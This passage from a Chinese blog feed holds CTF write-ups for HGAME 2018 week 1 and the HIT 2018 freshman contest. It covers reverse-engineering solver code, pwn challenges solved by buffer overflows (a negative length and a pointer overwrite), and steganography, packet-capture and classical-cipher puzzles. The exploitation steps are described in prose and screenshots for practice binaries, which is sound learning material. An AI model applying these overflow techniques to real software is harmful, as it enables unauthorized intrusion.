&lt;pre data-lang=&quot;cpp&quot; class=&quot;language-cpp &quot;&gt;&lt;code class=&quot;language-cpp&quot; data-lang=&quot;cpp&quot;&gt;&amp;#x2F;&amp;#x2F;baby2.cpp
#include &amp;lt;bits&amp;#x2F;stdc++.h&amp;gt;
using namespace std;
int arr[]={141,153,71,245,246,85,245,217,96,209,219,21,228,196,102,208,164,141,86,95};
int main()
{
&amp;#x2F;&amp;#x2F;	for(int i=0;i&amp;lt;20;++i){
&amp;#x2F;&amp;#x2F;		newa[indx[i]]=arr[i];
&amp;#x2F;&amp;#x2F;	}
&amp;#x2F;&amp;#x2F;	for(int i=0;i&amp;lt;20;++i){
&amp;#x2F;&amp;#x2F;		cout&amp;lt;&amp;lt;newa[i]&amp;lt;&amp;lt;&amp;#x27;,&amp;#x27;;
&amp;#x2F;&amp;#x2F;	}
	swap(arr[10],arr[15]);
	swap(arr[10],arr[6]);
	swap(arr[6],arr[3]);
	swap(arr[3],arr[1]);
	swap(arr[0],arr[1]);
	for(int i=0;i&amp;lt;20;++i){
		printf(&amp;quot;%d,&amp;quot;,arr[i]);
	}
	return 0;
}
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;cpp&quot; class=&quot;language-cpp &quot;&gt;&lt;code class=&quot;language-cpp&quot; data-lang=&quot;cpp&quot;&gt;&amp;#x2F;&amp;#x2F;baby3.cpp
#include &amp;lt;bits&amp;#x2F;stdc++.h&amp;gt;
using namespace std;
uint8_t arr[]={208,141,71,153,246,85,245,217,96,209,245,21,228,196,102,219,164,141,86,95};
unsigned char flg[22]=&amp;quot;&amp;quot;;
int main()
{
	for(int i=0;i&amp;lt;20;++i){
		bitset&amp;lt;8&amp;gt; a(arr[i]);
		cout&amp;lt;&amp;lt;a&amp;lt;&amp;lt;endl;
		if(i%4==1){
			a=(a&amp;lt;&amp;lt;6)|(a&amp;gt;&amp;gt;2);
		}else if(i%4==2){
			a=(a&amp;gt;&amp;gt;4)|(a&amp;lt;&amp;lt;4);
		}else if(i%4==3){
			a=(a&amp;lt;&amp;lt;2)|(a&amp;gt;&amp;gt;6);
		}else{
			a=(a&amp;gt;&amp;gt;1)|(a&amp;lt;&amp;lt;7);
		}
		cout&amp;lt;&amp;lt;a&amp;lt;&amp;lt;&amp;#x27; &amp;#x27;&amp;lt;&amp;lt;a.to_ulong()&amp;lt;&amp;lt;endl;
		flg[i]=a.to_ulong();
	}
	for(int i=0;i&amp;lt;20;++i){
		cout&amp;lt;&amp;lt;char(flg[i]);
	}
}
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;这里需要说一下……
C&#x2F;C++的左右移有毒！换bitset保平安！&lt;&#x2F;p&gt;
&lt;h2 id=&quot;nop-pop&quot;&gt;nop_pop&lt;&#x2F;h2&gt;
&lt;p&gt;一月霸权当然是我pop team epic啦！食我粪作！
EXEinfo显示是PE文件，那就运行一下看
&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180208_110751.png&quot; alt=&quot;nop_pop1&quot; &#x2F;&gt;
打开OD搜一下
&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180204_233230.png&quot; alt=&quot;nop_pop2&quot; &#x2F;&gt;
先是把跳转nop掉，然后出来那个Con...的，联系出题人，出题人表示是要nop掉pop子
于是再看，然后发现上面有个nop_me（提示真明显wwwww）
nop掉，程序发给出题人，得到flag&lt;&#x2F;p&gt;
&lt;h2 id=&quot;sc2-player&quot;&gt;sc2_player&lt;&#x2F;h2&gt;
&lt;p&gt;看了一下程序F5出来的东西大概做了这几步操作&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;arr=(index%7+35)^special&lt;&#x2F;li&gt;
&lt;li&gt;special(index%7)=special^0x34&lt;&#x2F;li&gt;
&lt;li&gt;arr=input^ index^(index&#x2F;7)
这几个都是长度为28的数组，arr是最后用来比对的数组，input是输入的flag，special是一个程序存储的数组
所以前两步有什么意义……&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;cpp&quot; class=&quot;language-cpp &quot;&gt;&lt;code class=&quot;language-cpp&quot; data-lang=&quot;cpp&quot;&gt;&amp;#x2F;&amp;#x2F;sc2.cpp
#include &amp;lt;bits&amp;#x2F;stdc++.h&amp;gt;
using namespace std;
char arr[29]={104,98,118,101,127,72,50,127,86,124,99,63,82,101,72,108,77,116,101,32,114,115,74,96,115,127,124,101};
int main()
{
	for(int i=0;i&amp;lt;28;++i){
		arr[i]=arr[i]^i^(i&amp;#x2F;7);
	}
	for(int i=0;i&amp;lt;28;++i){
		putchar(arr[i]);
	}
}
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;pwn&quot;&gt;PWN&lt;&#x2F;h1&gt;
&lt;p&gt;前两题做的时候不在家，借朋友电脑用了下&lt;&#x2F;p&gt;
&lt;h2 id=&quot;guess-number&quot;&gt;guess_number&lt;&#x2F;h2&gt;
&lt;p&gt;其实是很明显的溢出，scanf这个东西不安全，可以直接覆盖到比较的数字
&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180207_222045.png&quot; alt=&quot;guess_number&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;flag-server&quot;&gt;flag_server&lt;&#x2F;h2&gt;
&lt;p&gt;还是输入超限，不过一开始要输入长度而且还不能大于63，后面的对比又用!=（继续吐槽我那个超喜欢用!=的队友
所以输入一个负数就好了
然后就可以覆盖到猜测的数字了
&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180207_221248.png&quot; alt=&quot;flag_server&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;zazahui&quot;&gt;zazahui&lt;&#x2F;h2&gt;
&lt;p&gt;先看整个流程，发现它先把flag读进了一个固定地址
这次换成了read，但是大小却是188，于是还是能搞事，直接用地址覆盖后面的*s就能输出flag了
&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180208_112204.png&quot; alt=&quot;zazahui1&quot; &#x2F;&gt;
本机测试过关直接发payload了，顺便*s后面是计数器，所以可以覆盖可以不覆盖，但是不能改成0，那样就直接退出了
&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180207_220202.png&quot; alt=&quot;zazahui2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h1 id=&quot;misc&quot;&gt;Misc&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;bai-cai-1&quot;&gt;白菜1&lt;&#x2F;h2&gt;
&lt;p&gt;先用stegsolver打开看了一遍，都没东西
于是考虑lsb（算是常规套路了吧）
&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180205_012851.png&quot; alt=&quot;白菜1_1&quot; &#x2F;&gt;
然后文件头不熟练的我还跑了下binwalk,wwwwwww
&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180205_013254.png&quot; alt=&quot;白菜1_2&quot; &#x2F;&gt;
就是个zip包，解压出来就是flag&lt;&#x2F;p&gt;
&lt;h2 id=&quot;bai-cai-2&quot;&gt;白菜2&lt;&#x2F;h2&gt;
&lt;p&gt;跑一下binwalk，发现有东西
然后就得到了flag
&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180204_230153.png&quot; alt=&quot;白菜2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;pacp1&quot;&gt;pacp1&lt;&#x2F;h2&gt;
&lt;p&gt;搜下flag
&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180204_225419.png&quot; alt=&quot;pacp1_1&quot; &#x2F;&gt;
看最后这个返回200的分组
&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180204_225549.png&quot; alt=&quot;pacp1_2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h1 id=&quot;crypto&quot;&gt;Crypto&lt;&#x2F;h1&gt;
&lt;p&gt;知识点全部给出来了哇，真系给力&lt;&#x2F;p&gt;
&lt;h2 id=&quot;easy-caesar&quot;&gt;easy Caesar&lt;&#x2F;h2&gt;
&lt;p&gt;一开始题目还有错，于是找出题人说，拿到了1血（然而改错没加分wwww）
直接上工具
&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180208_113617.png&quot; alt=&quot;easy_Caesar&quot; &#x2F;&gt;
然后数字也有变过，那么按照常识判断，就是qu1ck,4x,la2y,br0wn
于是有了flag&lt;&#x2F;p&gt;
&lt;h2 id=&quot;polybius&quot;&gt;Polybius&lt;&#x2F;h2&gt;
&lt;p&gt;看到的时候就反应过来了，可惜当时没找到工具手解的……
看它给的提示网址https:&#x2F;&#x2F;www.wikiwand[.]com&#x2F;en&#x2F;Polybius#&#x2F;Cryptography就行了，这种出题真的很照顾人了&lt;&#x2F;p&gt;
&lt;h2 id=&quot;hill&quot;&gt;Hill&lt;&#x2F;h2&gt;
&lt;p&gt;学到了一种新的加密方式，不过要算数论中矩阵的逆，如果阶数高了，感觉就是灾难啊……
顺便我又没找到工具一开始还没仔细看链接，矩阵的逆还是手算的……淦了
同样的https:&#x2F;&#x2F;www.wikiwand[.]com&#x2F;en&#x2F;Hill_cipher
&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180204_221038.png&quot; alt=&quot;Hill&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;confusion&quot;&gt;confusion&lt;&#x2F;h2&gt;
&lt;p&gt;这个题就比较舒服，不就是大杂烩嘛，上工具~
&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180204_211631.png&quot; alt=&quot;confusion1&quot; &#x2F;&gt;
&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180204_211959.png&quot; alt=&quot;confusion2&quot; &#x2F;&gt;
&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180204_212008.png&quot; alt=&quot;confusion3&quot; &#x2F;&gt;
&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180204_212027.png&quot; alt=&quot;confusion4&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;baby-step&quot;&gt;baby step&lt;&#x2F;h2&gt;
&lt;p&gt;刚学完密码学，然而不想自己手写
网上直接找的python脚本太腊鸡了……慢得不行
最后换ACM大佬博客找的就好了
解出来基础解是191091022097，然后加上i个0x1111111111模0x976693344d的逆元就好，顺便后面这个数是质数，所以逆元可以用费马小定理算&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>HIT2018新生赛部分WP</title>
		<published>2018-02-03T12:33:00+08:00</published>
		<updated>2020-08-07T01:48:37.573723+08:00</updated>
		<link rel="alternate" href="https://CSUwangj.github.io/hit2018xin-sheng-sai/" type="text/html"/>
		<id>https://CSUwangj.github.io/hit2018xin-sheng-sai/</id>
		<content type="html">&lt;p&gt;只会写水题，要好好学习了&lt;&#x2F;p&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;&lt;h2 id=&quot;baby-android&quot;&gt;Baby Android&lt;&#x2F;h2&gt;
&lt;p&gt;安卓逆向助手打开，发现就是异或，两个字符串摘一下异或一下得到flag&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hit2018xin-sheng-sai&#x2F;snipaste20180201_181332.jpg&quot; alt=&quot;Baby_Android&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;easy-xor&quot;&gt;Easy_XOR&lt;&#x2F;h2&gt;
&lt;p&gt;发现出题人拿同一个密钥加密了两个文件，而且还有一份明文，直接异或得到flag（所以感觉这个是不是没考中考点？）&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hit2018xin-sheng-sai&#x2F;snipaste20180201_115025.jpg&quot; alt=&quot;EASY_XOR&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;hitctf-2018qian-dao&quot;&gt;HITCTF 2018签到&lt;&#x2F;h2&gt;
&lt;p&gt;不会翻墙学个P的计算机呀，翻墙搜索看视频得到flag&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hit2018xin-sheng-sai&#x2F;snipaste20180201_090539.jpg&quot; alt=&quot;签到&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;baso4&quot;&gt;BaSO4&lt;&#x2F;h2&gt;
&lt;p&gt;就是base64&#x2F;32混合嘛，其实这种混合的一般来说很好解，因为&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Base64中有[0-9a-zA-Z+&#x2F;=]&lt;&#x2F;li&gt;
&lt;li&gt;Base32中有[A-Z2-7=]&lt;&#x2F;li&gt;
&lt;li&gt;Base16中有[0-9A-F]&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;于是拿出以前写的脚本手动选择跑一下（等有空改成自动的）&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hit2018xin-sheng-sai&#x2F;snipaste20180201_094323.jpg&quot; alt=&quot;BaSO4&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;gong-ji-liu-liang-fen-xi&quot;&gt;攻击流量分析&lt;&#x2F;h2&gt;
&lt;p&gt;看前面就是尝试找flag未遂，一堆404，拖到最后终于看到200。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hit2018xin-sheng-sai&#x2F;snipaste20180201_091517.jpg&quot; alt=&quot;攻击流量分析1&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;把数据保存下来跑一边gzuncompress就好&lt;&#x2F;p&gt;
&lt;p&gt;我是用在线工具搞得，所以为了复制不可见字符先base64一下咯&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hit2018xin-sheng-sai&#x2F;snipaste20180201_093215.jpg&quot; alt=&quot;攻击流量分析2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;jian-pan-liu-liang-fen-xi&quot;&gt;键盘流量分析&lt;&#x2F;h2&gt;
&lt;p&gt;首先用命令&lt;&#x2F;p&gt;
&lt;pre&gt;&lt;code&gt;tshark -r keyboard.pcap -T field -e usb.capdata &amp;gt; usbdata.txt
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;把按键数据抓出来&lt;&#x2F;p&gt;
&lt;p&gt;然后发现只有中间的是8字节的键盘数据，反正也不多就干脆看着敲出来了&lt;&#x2F;p&gt;
&lt;p&gt;用第三个字节查表，首字节的02表示上档键，这个不知道也可以猜出来&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hit2018xin-sheng-sai&#x2F;snipaste20180201_105518.jpg&quot; alt=&quot;键盘流量分析&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;use-your-ida-shi-jian-dao-yi-hou-tu-ran-xiang-dao&quot;&gt;use_your_ida（时间到以后突然想到）&lt;&#x2F;h2&gt;
&lt;p&gt;时间到以后群友一说距离视图突然反应过来……&lt;&#x2F;p&gt;
&lt;p&gt;给大佬递IDA.jpg……&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hit2018xin-sheng-sai&#x2F;snipaste20180202_222509.jpg&quot; alt=&quot;use_your_ida&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;算是一种隐写吧，大概&lt;&#x2F;p&gt;
</content>
	</entry>
</feed>
